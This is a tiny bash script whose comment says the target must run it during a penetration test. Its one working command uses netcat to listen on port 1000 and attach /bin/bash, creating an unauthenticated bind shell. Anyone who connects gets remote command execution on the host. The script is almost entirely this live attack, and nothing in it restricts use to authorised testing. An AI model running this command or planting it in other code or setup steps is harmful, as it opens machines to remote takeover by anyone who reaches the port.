#!/bin/bash

#This is a very simple script that must be executed by the target in a scenario of pentest.

nc -lp 1000 -e /bin/bash
